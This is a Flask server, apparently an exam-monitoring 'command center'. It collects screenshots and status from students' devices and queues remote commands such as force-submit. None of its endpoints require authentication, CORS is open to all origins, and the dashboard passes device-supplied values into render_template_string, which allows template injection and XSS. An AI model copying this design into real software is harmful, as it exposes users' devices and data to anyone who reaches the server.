from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import json
import os
import threading
import time
from datetime import datetime, timedelta
from collections import defaultdict

app = Flask(__name__)
# تفعيل CORS للسماح بالاتصال من أي مكان (أندرويد، متصفح، ملفات محلية)
CORS(app, resources={r"/*": {"origins": "*"}})

# زيادة حجم البيانات المسموح بها لاستلام الصور الكبيرة
app.config['MAX_CONTENT_LENGTH'] = 32 * 1024 * 1024  # 32MB

# ملفات تخزين البيانات لضمان عدم ضياعها عند إعادة التشغيل
DATA_FILE = '/tmp/octopus_data.json'
COMMANDS_FILE = '/tmp/octopus_cmds.json'

# مخازن البيانات في الذاكرة
students = defaultdict(dict)
pending_commands = defaultdict(list)

# --- دوال مساعدة ---
def load_data():
    """تحميل البيانات المحفوظة"""
    global students, pending_commands
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                students.update(json.load(f))
        if os.path.exists(COMMANDS_FILE):
            with open(COMMANDS_FILE, 'r') as f:
                pending_commands.update(json.load(f))
    except Exception as e:
        print(f"📂 Load Error: {e}")

def save_data():
    """حفظ البيانات"""
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(dict(students), f)
        with open(COMMANDS_FILE, 'w') as f:
            json.dump(dict(pending_commands), f)
    except Exception as e:
        print(f"💾 Save Error: {e}")

# تحميل البيانات عند البدء
load_data()

def cleanup_loop():
    """تنظيف تلقائي للأجهزة القديمة جداً"""
    while True:
        now = datetime.utcnow()
        to_remove = []
        for sid, data in students.items():
            last = data.get('last_update')
            if last:
                try:
                    if (now - datetime.fromisoformat(last)) > timedelta(hours=24):
                        to_remove.append(sid)
                except: pass
        for sid in to_remove:
            del students[sid]
        time.sleep(3600)

threading.Thread(target=cleanup_loop, daemon=True).start()

# --- المسارات (Endpoints) ---

@app.route('/', methods=['GET', 'POST', 'OPTIONS'])
def track():
    """استقبال نبضات القلب والبيانات من الأجهزة"""
    if request.method == 'OPTIONS': return '', 204
    
    try:
        data = request.json or request.values.to_dict() or request.args.to_dict()
        if not data or 'device_id' not in data:
            return jsonify({"status": "error", "msg": "No ID"}), 400

        did = data['device_id']
        
        # تحديث بيانات الطالب
        students[did].update(data)
        students[did]['last_update'] = datetime.utcnow().isoformat()
        students[did]['ip_address'] = request.remote_addr
        
        # إذا كانت صورة، نحفظها في الذاكرة (مؤقتاً للعرض)
        if data.get('event') == 'screenshot_data':
            students[did]['last_screenshot'] = data.get('img')
            print(f"📸 Screenshot from {did}")

        save_data()
        return jsonify({"status": "success", "cmds": len(pending_commands.get(did, []))})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)}), 500

@app.route('/get_commands', methods=['GET'])
def get_commands():
    """الجهاز يطلب الأوامر من هنا"""
    did = request.args.get('device_id')
    if not did: return jsonify([])
    
    cmds = pending_commands.get(did, [])
    if cmds:
        pending_commands[did] = [] # مسح الأوامر بعد تسليمها
        save_data()
        print(f"📡 Device {did} received commands")
    
    return jsonify(cmds)

@app.route('/send_command', methods=['POST'])
def send_command():
    """إرسال أمر من لوحة التحكم (الويب أو التطبيق)"""
    try:
        data = request.json
        did = data.get('device_id')
        if not did: return jsonify({"status": "error"}), 400
        
        pending_commands[did].append(data)
        save_data()
        return jsonify({"status": "queued", "device_id": did})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)}), 500

@app.route('/api/students')
def api_students():
    """API للوحة التحكم الخارجية"""
    return jsonify(list(students.values()))

# --- واجهة الويب المتكاملة (Dashboard + Control) ---
@app.route('/view')
def view_dashboard():
    now = datetime.utcnow()
    rows = ""
    active_count = 0
    
    # ترتيب: النشط أولاً، ثم حسب الوقت
    sorted_items = sorted(
        students.items(), 
        key=lambda x: (
            1 if (now - datetime.fromisoformat(x[1].get('last_update', now.isoformat()))).total_seconds() < 60 else 0,
            x[1].get('last_update', '')
        ), 
        reverse=True
    )

    for idx, (did, data) in enumerate(sorted_items, 1):
        last_up_str = data.get('last_update', now.isoformat())
        try:
            last_up = datetime.fromisoformat(last_up_str)
            diff = (now - last_up).total_seconds()
        except: diff = 9999

        is_active = diff < 60
        status_class = "status-active" if is_active else "status-inactive"
        status_text = "🟢 ONLINE" if is_active else "🔴 OFFLINE"
        if is_active: active_count += 1
        
        # أزرار التحكم المباشر من الويب
        controls = f"""
        <div class="btn-group btn-group-sm">
            <button onclick="cmd('{did}', 'screenshot')" class="btn btn-outline-info" title="Screenshot">📸</button>
            <button onclick="cmd('{did}', 'alert')" class="btn btn-outline-warning" title="Alert">🔔</button>
            <button onclick="cmd('{did}', 'force_submit')" class="btn btn-outline-danger" title="Force Submit">⛔</button>
            <button onclick="cmd('{did}', 'reload')" class="btn btn-outline-success" title="Reload">🔄</button>
        </div>
        """

        rows += f"""
        <tr>
            <td>{idx}</td>
            <td><span class="device-id">{did}</span></td>
            <td>{data.get('quiz', 'Unknown')}</td>
            <td>{data.get('answers_count', '0')}</td>
            <td>{data.get('time_left', '0')}s</td>
            <td><span class="{status_class}">{status_text}</span></td>
            <td>{last_up.strftime('%H:%M:%S')}</td>
            <td>{controls}</td>
        </tr>
        """

    html = f"""
    <!DOCTYPE html>
    <html dir="ltr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Octopus Command Center</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body {{ background: #0f172a; color: #f8fafc; font-family: 'Segoe UI', sans-serif; }}
            .container {{ max-width: 1400px; margin-top: 30px; }}
            .card {{ background: #1e293b; border: 1px solid #334155; border-radius: 12px; }}
            .table {{ --bs-table-bg: transparent; --bs-table-color: #cbd5e1; }}
            th {{ color: #38bdf8; border-bottom: 2px solid #475569 !important; }}
            td {{ vertical-align: middle; border-bottom: 1px solid #334155; }}
            .device-id {{ font-family: monospace; background: #020617; padding: 4px 8px; border-radius: 4px; color: #f472b6; }}
            .status-active {{ color: #4ade80; font-weight: bold; text-shadow: 0 0 10px rgba(74, 222, 128, 0.3); }}
            .status-inactive {{ color: #94a3b8; }}
            .stat-box {{ background: #0f172a; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #334155; }}
            .stat-val {{ font-size: 1.8rem; font-weight: 700; color: #38bdf8; }}
            .btn-outline-info:hover {{ background: #0dcaf0; color: #000; }}
        </style>
        <script>
            function cmd(id, type) {{
                let msg = "";
                if(type === 'alert') msg = prompt("Enter alert message:");
                if(type === 'alert' && !msg) return;

                fetch('/send_command', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{device_id: id, type: type, message: msg}})
                }})
                .then(r => r.json())
                .then(d => {{
                    if(d.status === 'queued') alert("✅ Command Sent Successfully!");
                    else alert("❌ Failed: " + d.msg);
                }});
            }}
            setTimeout(() => location.reload(), 10000);
        </script>
    </head>
    <body>
        <div class="container">
            <div class="d-flex justify-content-between align-items-center mb-4">
                <div>
                    <h2 class="mb-0 text-white">🐙 <span style="color: #38bdf8">OCTOPUS</span> COMMAND CENTER</h2>
                    <small class="text-muted">Real-time Monitoring & Control System</small>
                </div>
                <div><span class="badge bg-success p-2">SYSTEM ONLINE</span></div>
            </div>

            <div class="row g-3 mb-4">
                <div class="col-md-3"><div class="stat-box"><div class="stat-val">{len(students)}</div><div>Total Devices</div></div></div>
                <div class="col-md-3"><div class="stat-box"><div class="stat-val" style="color: #4ade80">{active_count}</div><div>Active Now</div></div></div>
                <div class="col-md-3"><div class="stat-box"><div class="stat-val">{datetime.now().strftime('%H:%M')}</div><div>Server Time</div></div></div>
                <div class="col-md-3"><div class="stat-box"><div class="stat-val">{len(pending_commands)}</div><div>Pending Cmds</div></div></div>
            </div>

            <div class="card p-3">
                <div class="table-responsive">
                    <table class="table table-hover">
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Device ID</th>
                                <th>Exam</th>
                                <th>Answers</th>
                                <th>Left</th>
                                <th>Status</th>
                                <th>Last Seen</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            {rows}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </body>
    </html>
    """
    return render_template_string(html)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
